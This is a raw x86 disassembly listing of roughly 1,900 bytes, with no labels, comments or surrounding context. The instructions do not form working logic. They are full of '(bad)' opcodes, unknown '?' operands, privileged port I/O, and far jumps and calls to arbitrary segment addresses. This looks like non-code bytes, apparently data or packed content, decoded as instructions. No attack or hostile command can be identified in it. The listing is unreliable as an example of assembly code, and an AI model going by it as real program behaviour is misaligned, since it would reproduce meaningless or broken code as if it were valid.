  51cd51:	mov    ebp,0xeee97009
  51cd56:	imul   esp,esi,0x4d
  51cd59:	into   
  51cd5a:	xlat   BYTE PTR ds:[ebx]
  51cd5b:	push   es
  51cd5c:	adc    eax,0xdb44dee6
  51cd61:	popa   
  51cd62:	mov    bl,0xa4
  51cd64:	fcmovb st,st(4)
  51cd66:	imul   edi,DWORD PTR [esi+0x7c1a2e5e],0xffffffdc
  51cd6d:	sbb    dh,cl
  51cd6f:	fs xchg edi,eax
  51cd71:	or     eax,0xdc87abc1
  51cd76:	shr    BYTE PTR [ebp-0x10],1
  51cd79:	xor    DWORD PTR [eax],ebx
  51cd7b:	(bad)  ds:0xeda69ca2
  51cd81:	jge    0x51cd83
  51cd83:	inc    eax
  51cd84:	cli    
  51cd85:	jns    0x51cdd1
  51cd87:	inc    edx
  51cd88:	pop    esp
  51cd89:	mov    ecx,0xce2ec920
  51cd8e:	cmp    eax,0x1d481896
  51cd93:	jbe    0x51cd66
  51cd95:	push   eax
  51cd97:	push   edi
  51cd98:	popf   
  51cd99:	sub    edi,ecx
  51cd9b:	or     al,0xb0
  51cd9d:	in     eax,dx
  51cd9e:	inc    esi
  51cd9f:	lods   al,BYTE PTR ds:[esi]
  51cda0:	(bad)  
  51cda1:	rcr    DWORD PTR [edx-0x48bb1dc7],cl
  51cda7:	and    edx,edx
  51cda9:	inc    edi
  51cdaa:	cmp    al,0xc5
  51cdac:	xor    cl,0xf4
  51cdaf:	daa    
  51cdb0:	mov    edi,0x584b5a85
  51cdb5:	scas   al,BYTE PTR es:[edi]
  51cdb6:	or     cl,BYTE PTR [ecx+0x1f]
  51cdb9:	sub    ebx,DWORD PTR [ecx-0x2e379941]
  51cdbf:	inc    eax
  51cdc0:	outs   dx,BYTE PTR ds:[esi]
  51cdc1:	sbb    al,0xab
  51cdc3:	cmp    BYTE PTR [esi+0x24c286ad],bh
  51cdc9:	int3   
  51cdca:	xchg   esp,eax
  51cdcb:	sub    al,0x20
  51cdcd:	outs   dx,DWORD PTR ds:[esi]
  51cdce:	push   esp
  51cdcf:	(bad)  
  51cdd0:	jg     0x51cdc0
  51cdd2:	ins    DWORD PTR es:[edi],dx
  51cdd3:	push   es
  51cdd4:	mov    esi,0x98f4e9e2
  51cdd9:	lea    ebp,[edi-0x6c4d56ad]
  51cddf:	add    al,0x91
  51cde1:	sti    
  51cde2:	mov    cs,esi
  51cde4:	mov    bl,0xcb
  51cde6:	sbb    al,0x87
  51cde8:	stos   BYTE PTR es:[edi],al
  51cde9:	aas    
  51cdea:	arpl   WORD PTR [ecx],sp
  51cdec:	cmp    dl,ch
  51cdee:	bound  ebp,QWORD PTR [edx+0x75d957d0]
  51cdf4:	pop    eax
  51cdf5:	dec    ebx
  51cdf6:	shld   esp,edi,cl
  51cdf9:	cmp    ecx,DWORD PTR [ecx]
  51cdfb:	test   bl,0x31
  51cdfe:	dec    edi
  51cdff:	mov    esi,0x2b1dca98
  51ce04:	mov    ebp,0x1d135c78
  51ce09:	xlat   BYTE PTR ds:[ebx]
  51ce0a:	repnz cmp eax,0x876f1413
  51ce10:	cli    
  51ce11:	fild   QWORD PTR [esi-0x23355e65]
  51ce17:	mov    ebx,0x9966ec2f
  51ce1c:	dec    edi
  51ce1d:	aam    0xb
  51ce1f:	repnz (bad) 
  51ce22:	sbb    eax,0x88565f0b
  51ce27:	push   ds
  51ce28:	add    eax,0xcd7adae
  51ce2d:	mov    ds:0xd588d614,al
  51ce32:	pushf  
  51ce33:	push   cs
  51ce34:	pusha  
  51ce35:	push   ecx
  51ce36:	call   0xa35afba8
  51ce3b:	gs inc ebx
  51ce3d:	mov    esp,edi
  51ce3f:	cmp    eax,0x9c177805
  51ce44:	pop    ecx
  51ce45:	jle    0x51cdd6
  51ce47:	xchg   esp,eax
  51ce48:	int    0x9e
  51ce4a:	mov    ebx,0x753458b0
  51ce4f:	xlat   BYTE PTR ds:[ebx]
  51ce50:	jmp    0x286f:0x2118f91e
  51ce57:	push   eax
  51ce58:	js     0x51ce93
  51ce5a:	mov    ch,0xae
  51ce5c:	mov    bh,0xb5
  51ce5e:	test   eax,0x29d54bfd
  51ce63:	push   edi
  51ce64:	mov    bh,BYTE PTR [edx+eiz*1-0x695bc17]
  51ce6b:	push   ds
  51ce6c:	fbstp  TBYTE PTR [ebx+0x1d]
  51ce6f:	xor    esp,esp
  51ce71:	in     eax,0x1a
  51ce73:	xchg   edi,eax
  51ce74:	pop    esp
  51ce75:	iret   
  51ce76:	mov    dl,0xb3
  51ce78:	jecxz  0x51ceb0
  51ce7a:	mov    bl,0x81
  51ce7c:	sub    al,0x9b
  51ce7e:	or     BYTE PTR [ebx+ecx*2-0x33995004],ah
  51ce85:	xor    BYTE PTR [edx+0x4e],bh
  51ce88:	adc    DWORD PTR [edi-0x6b],0xc69dce7b
  51ce8f:	aaa    
  51ce90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51ce91:	call   0xf036:0x57a39ac8
  51ce98:	inc    edx
  51ce99:	aam    0x14
  51ce9b:	xchg   esp,eax
  51ce9c:	mov    eax,ds:0x7ef2e4a3
  51cea1:	shl    esp,1
  51cea3:	dec    edx
  51cea4:	mov    edx,0xeab7c7e9
  51cea9:	cmp    al,0xaa
  51ceab:	sbb    bh,dh
  51cead:	iret   
  51ceae:	outs   dx,BYTE PTR ds:[esi]
  51ceaf:	aad    0xad
  51ceb1:	sub    al,0xee
  51ceb3:	nop
  51ceb4:	jmp    0x949cf643
  51ceb9:	cmp    DWORD PTR [edx-0x602f1f9b],ebp
  51cebf:	icebp  
  51cec0:	dec    esp
  51cec1:	nop
  51cec2:	cmp    ebp,edi
  51cec4:	sti    
  51cec5:	mov    ebp,0x39e01dad
  51ceca:	push   esi
  51cecb:	jns    0x51cec7
  51cecd:	cmp    BYTE PTR [esi],dh
  51cecf:	or     BYTE PTR [edi],cl
  51ced1:	aad    0xfd
  51ced3:	mov    al,0x78
  51ced5:	leave  
  51ced6:	jmp    0xdbc147bf
  51cedb:	dec    ecx
  51cedc:	mov    DWORD PTR [eax],ecx
  51cede:	push   es
  51cedf:	mov    ds:0xbb84ed6c,al
  51cee4:	std    
  51cee5:	out    dx,al
  51cee6:	std    
  51cee7:	call   0x3f2fd7d7
  51ceec:	xchg   esi,eax
  51ceed:	pop    esp
  51ceee:	fwait
  51ceef:	scas   al,BYTE PTR es:[edi]
  51cef0:	add    ebx,ebp
  51cef2:	jne    0x51cf23
  51cef4:	push   esp
  51cef5:	in     eax,0x7e
  51cef7:	xchg   ebx,eax
  51cef8:	or     ah,BYTE PTR [ecx+0x19]
  51cefb:	or     dl,al
  51cefd:	or     BYTE PTR [eax+esi*2-0x73],bh
  51cf01:	call   0xb95a:0xbd654590
  51cf08:	loopne 0x51cf40
  51cf0a:	jb     0x51cece
  51cf0c:	cmp    BYTE PTR [edx+edx*2+0x2e],dh
  51cf10:	ins    DWORD PTR es:[edi],dx
  51cf11:	xor    al,BYTE PTR [esi]
  51cf13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51cf14:	sar    DWORD PTR [edi+0x50],0xd8
  51cf18:	(bad)  
  51cf19:	iret   
  51cf1a:	je     0x51cf3f
  51cf1c:	jmp    0x7079e234
  51cf21:	jne    0x51cead
  51cf23:	sbb    DWORD PTR [edx+0x7f02aebf],eax
  51cf29:	add    dh,BYTE PTR [ecx+esi*4-0x18]
  51cf2d:	or     DWORD PTR [ebx+edx*2+0x14ba90dc],ebp
  51cf34:	cmp    DWORD PTR [ebx-0x78],ebx
  51cf37:	outs   dx,DWORD PTR ds:[esi]
  51cf38:	(bad)  
  51cf39:	sbb    eax,0x61be84fc
  51cf3e:	adc    eax,0x2da9d598
  51cf43:	popf   
  51cf44:	mov    edi,0xc6a63
  51cf49:	pushf  
  51cf4a:	pop    esp
  51cf4b:	pop    edi
  51cf4c:	adc    esp,DWORD PTR [esi]
  51cf4e:	imul   esi,DWORD PTR [ebx-0x25fa4438],0x60c9297d
  51cf58:	ins    DWORD PTR es:[edi],dx
  51cf59:	iret   
  51cf5a:	add    eax,DWORD PTR [eax]
  51cf5c:	int    0xcb
  51cf5e:	add    ebx,ecx
  51cf60:	adc    BYTE PTR [ecx],bh
  51cf62:	jmp    0x9425:0xcaee487d
  51cf69:	cmp    al,dl
  51cf6b:	pop    ds
  51cf6c:	or     eax,0xa2116cd4
  51cf71:	sbb    eax,0xc2a8e0c2
  51cf76:	cwde   
  51cf77:	mov    WORD PTR [ecx+0x2a],gs
  51cf7a:	adc    eax,0xdaab9f98
  51cf7f:	mov    ?,WORD PTR [edx]
  51cf81:	jne    0x51cf8f
  51cf83:	sbb    BYTE PTR [edx+0x33d4b55e],bl
  51cf89:	repz cwde 
  51cf8b:	call   FWORD PTR [ebx+0x7f]
  51cf8e:	adc    edx,DWORD PTR [eax-0x74]
  51cf91:	outs   dx,DWORD PTR ds:[esi]
  51cf92:	(bad)
  51cf96:	cmp    esi,DWORD PTR [ecx-0x1d0cfa78]
  51cf9c:	jno    0x51cf7d
  51cf9e:	lds    ebp,FWORD PTR [edx+edx*1]
  51cfa1:	jecxz  0x51d014
  51cfa3:	xchg   esp,eax
  51cfa4:	pop    ecx
  51cfa5:	imul   edi,DWORD PTR [edi+0x46],0x12
  51cfa9:	jmp    0x51cf93
  51cfab:	repz xchg esp,eax
  51cfad:	push   esp
  51cfae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51cfaf:	cmp    eax,0x29c7207e
  51cfb4:	test   BYTE PTR [ecx-0x61],ah
  51cfb7:	xchg   DWORD PTR [eax],esi
  51cfb9:	in     al,0xee
  51cfbb:	push   0xffffffdc
  51cfbd:	dec    esi
  51cfbe:	mov    ch,BYTE PTR [ebx]
  51cfc0:	mov    al,ds:0x4eca4d48
  51cfc5:	xchg   esi,eax
  51cfc6:	bound  ebx,QWORD PTR [eax]
  51cfc8:	aad    0x5b
  51cfca:	or     BYTE PTR ss:[ebx+0x6d],0x30
  51cfcf:	je     0x51cfd9
  51cfd1:	xor    DWORD PTR [edi-0x65],ebp
  51cfd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51cfd5:	or     ebp,DWORD PTR [ebp-0x7545e6d2]
  51cfdb:	mov    dh,0x46
  51cfdd:	test   ah,al
  51cfdf:	aas    
  51cfe0:	xchg   edi,eax
  51cfe1:	mov    DWORD PTR [eax+0x72dbf79d],esi
  51cfe7:	clc    
  51cfe8:	sbb    dh,BYTE PTR [esi+edi*1+0x710a0ba]
  51cfef:	fdiv   st,st(5)
  51cff1:	pop    eax
  51cff2:	clc    
  51cff3:	dec    eax
  51cff4:	rcl    DWORD PTR [ecx+edx*1+0x59c189cf],1
  51cffb:	mov    ?,esp
  51cffd:	lahf   
  51cffe:	mov    WORD PTR [ebx],cs
  51d000:	cwde   
  51d001:	and    DWORD PTR [edi],0x66
  51d004:	shl    DWORD PTR [edi*8-0x612160cd],1
  51d00b:	pop    ecx
  51d00c:	call   0x35639b29
  51d011:	fist   WORD PTR [ecx]
  51d013:	jmp    0xbfe6:0x21a0e53
  51d01a:	and    edx,ecx
  51d01c:	stos   DWORD PTR es:[edi],eax
  51d01d:	cli    
  51d01e:	jecxz  0x51d09e
  51d020:	mov    BYTE PTR [ecx+0x2b],0xe7
  51d024:	inc    BYTE PTR [esi]
  51d026:	sti    
  51d027:	dec    edi
  51d028:	jl     0x51d0a0
  51d02a:	cmp    dh,BYTE PTR [eax]
  51d02c:	rcl    DWORD PTR [edi-0x2f277ceb],cl
  51d032:	test   DWORD PTR [edx],edx
  51d034:	jge    0x51cff4
  51d036:	xchg   bp,ax
  51d038:	xchg   ebp,eax
  51d039:	jae    0x51d027
  51d03b:	je     0x51d0b4
  51d03d:	out    0xa8,eax
  51d03f:	int    0x20
  51d041:	pop    es
  51d042:	xchg   BYTE PTR [ebx+0x59],ah
  51d045:	pop    ecx
  51d046:	out    0xca,eax
  51d048:	lahf   
  51d049:	lds    edx,FWORD PTR [ecx+0x50cc2e52]
  51d04f:	and    bh,dl
  51d051:	sahf   
  51d052:	add    DWORD PTR [esi-0x339b12f3],eax
  51d058:	sub    al,0xa2
  51d05a:	aad    0x42
  51d05c:	mov    dh,0xb3
  51d05e:	xchg   DWORD PTR [ebx+0x5f3efa9c],esp
  51d064:	jle    0x51d03d
  51d066:	bound  edx,QWORD PTR [eax]
  51d068:	sub    ebx,DWORD PTR [eax-0x7a38d5]
  51d06e:	cdq    
  51d06f:	inc    ecx
  51d070:	sti    
  51d071:	jae    0x51d0ad
  51d073:	pop    ss
  51d074:	scas   eax,DWORD PTR es:[edi]
  51d075:	inc    ebx
  51d076:	push   ecx
  51d077:	(bad)  
  51d079:	std    
  51d07a:	mov    fs,WORD PTR [ebx+0x5]
  51d07d:	rcl    BYTE PTR [ecx],cl
  51d07f:	mov    al,0x92
  51d081:	shl    DWORD PTR ds:0x3fe5f209,cl
  51d087:	mov    al,ds:0x98ad45f4
  51d08c:	jl     0x51d091
  51d08e:	xor    bl,BYTE PTR [edi]
  51d090:	ficomp WORD PTR [ebx-0x79272bfa]
  51d096:	ret    
  51d097:	inc    edx
  51d098:	cmp    BYTE PTR [ecx-0x38],ch
  51d09b:	(bad)  
  51d09c:	js     0x51d0d3
  51d09e:	loop   0x51d066
  51d0a0:	sbb    bl,BYTE PTR [ecx]
  51d0a2:	fwait
  51d0a3:	data16 loop 0x51d104
  51d0a6:	stos   WORD PTR es:[edi],ax
  51d0a8:	retf   
  51d0a9:	jg     0x51d08b
  51d0ab:	popf   
  51d0ac:	and    eax,0x456f0625
  51d0b1:	leave  
  51d0b2:	mov    edx,0xef36db1e
  51d0b7:	jle    0x51d10a
  51d0b9:	sar    DWORD PTR [edi+eax*8],cl
  51d0bc:	adc    edx,DWORD PTR [ebx]
  51d0be:	or     eax,0xab8d2467
  51d0c3:	inc    esi
  51d0c4:	shl    BYTE PTR [ebp+ebx*2-0x662b8160],0x60
  51d0cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51d0cd:	xchg   edi,eax
  51d0ce:	arpl   WORD PTR [eax],si
  51d0d0:	sub    BYTE PTR [ebp+0x70],al
  51d0d3:	int    0xfb
  51d0d5:	jg     0x51d10f
  51d0d7:	add    DWORD PTR [esi+0x60a4344],ecx
  51d0dd:	nop
  51d0de:	fisttp QWORD PTR [edi]
  51d0e0:	mov    ebx,0xe0380584
  51d0e5:	cs mov bl,0xaf
  51d0e8:	jp     0x51d0aa
  51d0ea:	add    al,0x15
  51d0ec:	sbb    BYTE PTR [eax+ecx*4-0x378a3a4c],0x76
  51d0f4:	imul   ecx,DWORD PTR [edx+0x3476d7df],0xffffffa3
  51d0fb:	shl    DWORD PTR [edx-0x25343728],1
  51d101:	enter  0x6979,0x3f
  51d105:	mov    ecx,0x777224da
  51d10a:	cmp    ah,BYTE PTR [esi-0x70]
  51d10d:	imul   edi,DWORD PTR [ecx+0x4acfc765],0x2d
  51d114:	ret    0x7fa4
  51d117:	xchg   ecx,eax
  51d118:	cwde   
  51d119:	test   DWORD PTR cs:[ecx-0x4f16e438],edx
  51d120:	jg     0x51d152
  51d122:	inc    eax
  51d123:	xchg   edi,eax
  51d124:	or     al,0xec
  51d126:	push   esp
  51d127:	ret    
  51d128:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51d129:	pop    ebp
  51d12a:	push   edi
  51d12b:	or     DWORD PTR [ebx+0xb8d2d94],esi
  51d131:	add    DWORD PTR [ebx+0x3e],edx
  51d134:	dec    ebp
  51d135:	or     eax,0x8cbe009f
  51d13a:	stos   BYTE PTR es:[edi],al
  51d13b:	dec    esi
  51d13c:	gs mov edx,0x6d1460cb
  51d142:	dec    edx
  51d143:	and    DWORD PTR [edi-0x7fca07ba],edx
  51d149:	jbe    0x51d166
  51d14b:	sub    al,0x6b
  51d14d:	shl    bh,cl
  51d14f:	adc    al,0x14
  51d151:	adc    eax,0xa52ef047
  51d156:	arpl   WORD PTR [esi+0x71],dx
  51d159:	scas   eax,DWORD PTR es:[edi]
  51d15a:	add    eax,esp
  51d15c:	daa    
  51d15d:	fdivr  st,st(6)
  51d15f:	cmp    dl,BYTE PTR [eax+0x69]
  51d162:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51d163:	rcr    cl,cl
  51d165:	adc    cl,cl
  51d167:	and    ecx,DWORD PTR [esi+esi*1]
  51d16a:	cli    
  51d16b:	fild   DWORD PTR [edx]
  51d16d:	mov    dh,0x26
  51d16f:	sub    DWORD PTR [eax-0x1a813dea],edx
  51d175:	test   al,0x58
  51d177:	and    dh,cl
  51d179:	mov    ecx,0x58661763
  51d17e:	pushf  
  51d17f:	ja     0x51d18b
  51d181:	jg     0x51d1a0
  51d183:	sbb    dl,bh
  51d185:	sub    al,0x11
  51d187:	jb     0x51d1ac
  51d189:	mov    BYTE PTR [eax+0x27],dh
  51d18c:	iret   
  51d18d:	or     al,0x7c
  51d18f:	pop    ecx
  51d190:	in     al,dx
  51d191:	xchg   BYTE PTR [esi+esi*2-0x6f],al
  51d195:	jecxz  0x51d15c
  51d197:	adc    ebx,DWORD PTR [ebx]
  51d199:	xlat   BYTE PTR ds:[ebx]
  51d19a:	test   DWORD PTR [ebp-0x80],esi
  51d19d:	mov    ds:0xfe046fe7,al
  51d1a2:	mov    dl,BYTE PTR [edx-0x574dbacf]
  51d1a8:	call   0x446c:0xa7ca83d8
  51d1af:	jmp    0x3eb1:0x4e068256
  51d1b6:	les    edi,FWORD PTR [ebx-0x65]
  51d1b9:	(bad)  
  51d1ba:	mov    ch,0x7e
  51d1bc:	sub    ebx,DWORD PTR [eax]
  51d1be:	sub    esi,DWORD PTR es:[ebp-0x53]
  51d1c2:	scas   eax,DWORD PTR es:[edi]
  51d1c3:	pusha  
  51d1c4:	or     ecx,eax
  51d1c6:	dec    edx
  51d1c7:	sbb    eax,0xc1ab04f4
  51d1cc:	mov    cl,0x25
  51d1ce:	frstor [eax-0x72]
  51d1d1:	sub    al,0xce
  51d1d3:	push   esi
  51d1d4:	call   0x630db39d
  51d1d9:	add    al,0x22
  51d1db:	jnp    0x51d18f
  51d1dd:	(bad)  
  51d1de:	in     al,dx
  51d1df:	std    
  51d1e0:	jl     0x51d188
  51d1e2:	pop    esi
  51d1e3:	cmp    dl,BYTE PTR [eax-0x67]
  51d1e6:	mov    ds:0xf349ca4e,al
  51d1eb:	lock es adc eax,0x7b3bb003
  51d1f2:	fsub   DWORD PTR [ebx-0x29]
  51d1f5:	xchg   esp,eax
  51d1f6:	push   edi
  51d1f7:	push   0x15
  51d1f9:	pop    ss
  51d1fa:	pop    edx
  51d1fb:	cld    
  51d1fc:	scas   eax,DWORD PTR es:[edi]
  51d1fd:	clc    
  51d1fe:	out    0x1e,al
  51d200:	bound  ecx,QWORD PTR [esi]
  51d202:	dec    ebx
  51d203:	cmp    al,0x3f
  51d205:	out    0x53,al
  51d207:	inc    edi
  51d208:	and    al,0x5
  51d20a:	out    0x87,al
  51d20c:	cmp    cl,ah
  51d20e:	repz aas 
  51d210:	in     al,0x10
  51d212:	sbb    esi,DWORD PTR ds:0x31473641
  51d218:	push   0x8c8ce6e
  51d21d:	pusha  
  51d21e:	(bad)  
  51d21f:	jmp    0xe16a4f62
  51d224:	dec    ebp
  51d225:	imul   ebx,ebx,0x15e74bd7
  51d22b:	rol    DWORD PTR [edi],0x86
  51d22e:	clc    
  51d22f:	shl    edx,0x17
  51d232:	fld    QWORD PTR [ebx+0x46]
  51d235:	mov    edi,0xdea151dc
  51d23a:	in     eax,dx
  51d23b:	or     DWORD PTR ds:0xb6973546,ebx
  51d241:	xor    DWORD PTR [edx-0x6253cfda],edx
  51d247:	mov    ebx,0x716fec50
  51d24c:	sbb    al,0xbb
  51d24e:	cmp    eax,0xe68bfd1e
  51d253:	dec    ebp
  51d254:	nop
  51d255:	dec    edx
  51d256:	inc    esp
  51d257:	stc    
  51d258:	jg     0x51d203
  51d25a:	push   0x41
  51d25c:	std    
  51d25d:	or     DWORD PTR [esi],ecx
  51d25f:	outs   dx,BYTE PTR ds:[esi]
  51d260:	adc    esi,DWORD PTR [ebx+ecx*4+0xe]
  51d264:	loope  0x51d25c
  51d266:	adc    BYTE PTR [edx],0xf4
  51d269:	mov    ebx,0xf0dd6ea2
  51d26e:	push   ebp
  51d26f:	jmp    DWORD PTR ds:0xf3511013
  51d275:	ficomp DWORD PTR [esi+0x6ca8bc7b]
  51d27b:	mov    esi,0xe8c930b5
  51d280:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51d281:	sub    cl,ah
  51d283:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  51d285:	push   ds
  51d286:	clc    
  51d287:	fistp  WORD PTR [eax]
  51d289:	sbb    cl,BYTE PTR [edi+0x31c930d2]
  51d28f:	aam    0x1c
  51d291:	fsubr  st,st(2)
  51d293:	or     BYTE PTR [eax-0x4ca71f50],dl
  51d299:	and    ch,ah
  51d29b:	mov    ch,0xd3
  51d29d:	cmp    al,0xb5
  51d29f:	imul   cl
  51d2a1:	xchg   ebx,eax
  51d2a2:	pop    ebp
  51d2a3:	imul   ebx,DWORD PTR [edi+0x5b],0x914fd4a4
  51d2aa:	xor    ch,BYTE PTR [eax]
  51d2ac:	dec    edx
  51d2ad:	in     eax,0x4
  51d2af:	push   cs
  51d2b0:	xchg   ebx,eax
  51d2b1:	(bad)  
  51d2b2:	add    ah,BYTE PTR [edi-0x2c]
  51d2b5:	jno    0x51d2f2
  51d2b7:	push   ds
  51d2b8:	pushf  
  51d2b9:	push   cs
  51d2ba:	cmp    BYTE PTR [edi-0x6c],bh
  51d2bd:	scas   al,BYTE PTR es:[edi]
  51d2be:	call   0x56a640dc
  51d2c3:	and    BYTE PTR [ebp-0x2a],al
  51d2c6:	outs   dx,BYTE PTR ds:[esi]
  51d2c7:	(bad)  
  51d2ca:	aad    0x1
  51d2cc:	xor    bh,0x19
  51d2cf:	jbe    0x51d30e
  51d2d1:	es xor eax,0x31d57f35
  51d2d7:	or     DWORD PTR ds:0xc4e872ae,ebp
  51d2dd:	sahf   
  51d2de:	and    BYTE PTR [ebx-0x6e827df1],ch
  51d2e4:	call   0x83c4:0xf5f68fee
  51d2eb:	je     0x51d2e0
  51d2ed:	fwait
  51d2ee:	or     eax,0xd560eda6
  51d2f3:	xor    al,0x5b
  51d2f5:	sbb    eax,0x3ddd5048
  51d2fa:	jp     0x51d33c
  51d2fc:	mov    bh,0x1b
  51d2fe:	cs mov bh,0x5e
  51d301:	lods   eax,DWORD PTR ds:[esi]
  51d302:	pop    esp
  51d303:	ret    0x30b4
  51d306:	out    0x24,al
  51d308:	lahf   
  51d309:	in     al,dx
  51d30a:	icebp  
  51d30b:	sbb    eax,0xe5bef323
  51d310:	xchg   edi,eax
  51d311:	or     eax,0x24108cfb
  51d316:	fisubr WORD PTR [edx-0x34]
  51d319:	mov    eax,ds:0xb4f3b455
  51d31e:	mov    al,0xd1
  51d320:	test   BYTE PTR [edi-0x57d02146],bl
  51d326:	adc    bh,BYTE PTR [esi]
  51d328:	sub    dh,BYTE PTR [esi-0x5e]
  51d32b:	jl     0x51d318
  51d32d:	push   es
  51d32e:	xchg   esp,eax
  51d32f:	call   DWORD PTR [ebx+0x8]
  51d332:	ins    BYTE PTR es:[edi],dx
  51d333:	out    dx,al
  51d334:	jmp    0x94dc649d
  51d339:	data16 xchg BYTE PTR cs:[ebx+0x6f69da5f],dh
  51d341:	dec    esi
  51d342:	inc    ecx
  51d343:	lock sub BYTE PTR [eax],dl
  51d346:	and    esi,ebp
  51d348:	mov    al,0xd
  51d34a:	push   ds
  51d34b:	iret   
  51d34c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51d34d:	inc    eax
  51d34e:	jae    0x51d3ab
  51d350:	and    cl,BYTE PTR [ebx]
  51d352:	push   ebp
  51d354:	retf   0x19bf
  51d357:	in     eax,0x53
  51d359:	sbb    BYTE PTR [eax],al
  51d35b:	out    0x37,al
  51d35d:	test   DWORD PTR [edi],ecx
  51d35f:	and    edx,DWORD PTR [esi-0x74]
  51d362:	mov    bh,0x71
  51d364:	jp     0x51d3ba
  51d366:	pop    esi
  51d367:	loope  0x51d3c0
  51d369:	adc    ebp,DWORD PTR [ebx-0x424045ff]
  51d36f:	mov    al,0xcd
  51d371:	add    al,0x9e
  51d373:	sbb    ebp,DWORD PTR [ebx-0x30]
  51d376:	jne    0x51d3f1
  51d378:	or     al,0xa7
  51d37a:	sub    edx,DWORD PTR [ebx+0x30bc236a]
  51d380:	add    eax,0x63a5ed85
  51d385:	pop    ecx
  51d386:	loopne 0x51d328
  51d388:	jmp    0x51d3c0
  51d38a:	push   ebx
  51d38b:	pop    esp
  51d38c:	ret    
  51d38d:	sub    al,0x47
  51d38f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51d390:	scas   eax,DWORD PTR es:[edi]
  51d391:	xor    al,0xb9
  51d393:	push   cs
  51d394:	aad    0x6e
  51d396:	mov    bh,0x40
  51d398:	sub    dh,dl
  51d39a:	mov    ch,0x2e
  51d39c:	mov    cl,0x9
  51d39e:	xchg   edi,eax
  51d39f:	imul   edx,DWORD PTR [edx-0x3ebeb9dc],0x2257f8ad
  51d3a9:	repnz and cl,BYTE PTR [ecx+0x63aff256]
  51d3b0:	ret    0xe82d
  51d3b3:	hlt    
  51d3b4:	test   al,0xba
  51d3b6:	out    dx,al
  51d3b7:	sub    DWORD PTR [eax+0x64],edx
  51d3ba:	xor    BYTE PTR [esi-0x7d],cl
  51d3bd:	fnstsw WORD PTR ds:0x8f3a0f69
  51d3c3:	and    DWORD PTR [esi+0x50e61c41],0xc
  51d3ca:	gs mov ecx,0xdae31a4d
  51d3d0:	push   edx
  51d3d1:	jmp    0x51d35d
  51d3d3:	mov    al,ds:0x9f844a2d
  51d3d8:	jle    0x51d3d4
  51d3da:	cld    
  51d3db:	pop    esi
  51d3dc:	out    dx,al
  51d3dd:	pop    esp
  51d3de:	push   ebx
  51d3df:	leave  
  51d3e0:	arpl   WORD PTR [eax],di
  51d3e2:	pop    eax
  51d3e3:	adc    eax,0xe2501472
  51d3e8:	stos   BYTE PTR es:[edi],al
  51d3e9:	out    dx,eax
  51d3ea:	leave  
  51d3eb:	test   DWORD PTR [ecx+0x1d],0xe3b7580c
  51d3f2:	fmul   QWORD PTR [ebp+0x7b]
  51d3f5:	push   eax
  51d3f6:	push   ss
  51d3f7:	xchg   ebx,eax
  51d3f8:	rcl    bh,cl
  51d3fa:	sbb    ch,BYTE PTR [edx+0x50]
  51d3fd:	inc    ebp
  51d3fe:	push   edx
  51d3ff:	je     0x51d392
  51d401:	mov    bh,0xee
  51d403:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51d404:	mov    ebp,0xaf5b1e7e
  51d409:	test   al,0xc6
  51d40b:	add    ebp,ecx
  51d40d:	sbb    ah,ch
  51d40f:	in     eax,dx
  51d410:	push   ds
  51d411:	cwde   
  51d412:	das    
  51d413:	lea    edx,[eax-0x7f]
  51d416:	fidiv  DWORD PTR gs:[esi+eiz*1-0x6f0f3922]
  51d41e:	xlat   BYTE PTR ds:[ebx]
  51d41f:	loopne 0x51d497
  51d421:	aas    
  51d422:	dec    edx
  51d423:	fild   WORD PTR [edi]
  51d425:	inc    ebx
  51d426:	fdiv   QWORD PTR [esi]
  51d428:	xchg   DWORD PTR [edi],ebx
  51d42a:	adc    al,0xbf
  51d42c:	xor    dh,bl
  51d42e:	sbb    esi,0xfffffff0
  51d431:	pusha  
  51d432:	hlt    
  51d433:	fcmovnu st,st(2)
  51d435:	inc    ecx
  51d436:	or     BYTE PTR [eax+0x1f],0x6f
  51d43a:	push   0x46db1019
  51d43f:	(bad)  
  51d440:	mov    edx,0x7a8ecbbd
  51d445:	std    
  51d446:	out    0x69,eax
  51d448:	fsub   st,st(6)
  51d44a:	cld    
  51d44b:	cdq    
  51d44c:	jle    0x51d3d2
  51d44e:	in     al,0x4f
  51d450:	mov    WORD PTR [edx-0xa],?
  51d453:	repz add cl,BYTE PTR [ebp+0x4f33cc1b]
  51d45a:	test   BYTE PTR [eax],bl
  51d45c:	mov    dh,BYTE PTR [ecx+ebx*1-0x6f289ab3]
  51d463:	push   edx
  51d464:	shl    BYTE PTR [ecx-0x57c3f77c],0xa0
  51d46b:	inc    ebx
  51d46c:	push   ecx
  51d46d:	mov    ebp,0xe3fa562
  51d472:	adc    ch,bl
  51d474:	mov    esi,0x7c2d05a4
  51d479:	ja     0x51d4b2
  51d47b:	shl    ebx,1
  51d47d:	mov    edx,0x35e41281
  51d482:	repz mov ?,WORD PTR [eax+0x56727f87]
  51d489:	push   edx
  51d48a:	and    ebx,DWORD PTR [edi]
  51d48c:	stc    
  51d48d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51d48e:	lds    ebp,FWORD PTR cs:[eax+0x3df6d390]
  51d495:	bound  esi,QWORD PTR [edi]
  51d497:	dec    ebx
  51d498:	outs   dx,DWORD PTR ds:[esi]
  51d499:	xor    eax,esi
  51d49b:	stos   DWORD PTR es:[edi],eax
  51d49c:	mov    eax,0x45055597
  51d4a1:	dec    ecx
  51d4a2:	push   edi
  51d4a3:	inc    esp
  51d4a4:	push   eax
  51d4a5:	stos   DWORD PTR es:[edi],eax
  51d4a6:	dec    esi
  51d4a7:	sub    dl,bh
  51d4a9:	inc    edi
  51d4aa:	ret    0x8f62
  51d4ad:	loopne 0x51d46b
  51d4af:	repz (bad) 
  51d4b2:	imul   esi,DWORD PTR [edi+0x45],0xffffffcf
  51d4b6:	pushf  
  51d4b7:	xor    dh,BYTE PTR [eax+0x4f]
  51d4ba:	mov    eax,0x5e206d95
